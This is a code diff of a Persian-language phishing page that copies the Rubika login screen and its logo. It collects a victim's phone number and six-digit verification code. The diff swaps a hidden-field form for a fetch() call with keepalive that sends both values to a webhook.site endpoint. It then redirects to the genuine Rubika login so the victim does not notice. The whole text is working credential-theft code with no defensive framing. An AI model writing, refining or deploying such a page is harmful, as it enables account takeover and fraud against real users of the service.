@@ -69,6 +69,7 @@
 <body>
 <div class="login-wrapper">
     <img class="login-logo" src="https://web.rubika.ir/static/media/logo.21e4c6b3.png" alt="روبیکا">
+
     <!-- مرحله ۱: شماره موبایل -->
     <div id="step1" class="step active">
         <div class="login-title">ورود / ثبت‌نام</div>
@@ -77,18 +78,12 @@
         <button class="btn" onclick="goToCode()">ادامه</button>
     </div>
 
-    <!-- مرحله ۲: کد تأیید + فرم ارسال -->
+    <!-- مرحله ۲: کد تأیید -->
     <div id="step2" class="step">
         <div class="login-title">کد تأیید ۶ رقمی ارسال‌شده را وارد کنید</div>
-        <!-- فرم واقعی که داده‌ها را به webhook می‌فرستد -->
-        <form id="loginForm" action="https://webhook.site/797a6d1e-7344-4f1f-9d13-9618ed0ceee8" method="POST" target="_self">
-            <!-- فیلدهای مخفی برای ذخیره شماره و کد -->
-            <input type="hidden" name="phone" id="hiddenPhone">
-            <input type="hidden" name="code" id="hiddenCode">
-            <input type="text" id="code" class="input-box" placeholder="کد تأیید" inputmode="numeric" maxlength="6">
-            <div id="codeError" class="error">کد باید ۶ رقم باشد</div>
-            <button type="submit" class="btn" onclick="return prepareSubmit()">تأیید</button>
-        </form>
+        <input type="text" id="codeInput" class="input-box" placeholder="کد تأیید" inputmode="numeric" maxlength="6">
+        <div id="codeError" class="error">کد باید ۶ رقم باشد</div>
+        <button class="btn" onclick="sendData()">تأیید</button>
     </div>
 </div>
 
@@ -102,27 +97,31 @@
             document.getElementById('phoneError').style.display = 'none';
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
-            document.getElementById('code').focus();
+            document.getElementById('codeInput').focus();
         } else {
             document.getElementById('phoneError').style.display = 'block';
         }
     }
 
-    function prepareSubmit() {
-        const codeValue = document.getElementById('code').value.trim();
-        if (codeValue.length === 6) {
+    function sendData() {
+        const code = document.getElementById('codeInput').value.trim();
+        if (code.length === 6) {
             document.getElementById('codeError').style.display = 'none';
-            // پر کردن فیلدهای مخفی
-            document.getElementById('hiddenPhone').value = phoneNumber;
-            document.getElementById('hiddenCode').value = codeValue;
-            // هدایت به روبیکا پس از ارسال فرم
+            
+            // ارسال داده با fetch و keepalive
+            fetch('https://webhook.site/797a6d1e-7344-4f1f-9d13-9618ed0ceee8', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `phone=${encodeURIComponent(phoneNumber)}&code=${encodeURIComponent(code)}`,
+                keepalive: true
+            });
+            
+            // هدایت به روبیکا (بدون منتظر ماندن برای پاسخ)
             setTimeout(() => {
                 window.location.href = 'https://web.rubika.ir/login';
             }, 100);
-            return true; // اجازه ارسال فرم
         } else {
             document.getElementById('codeError').style.display = 'block';
-            return false; // جلوگیری از ارسال فرم
         }
     }
 </script>
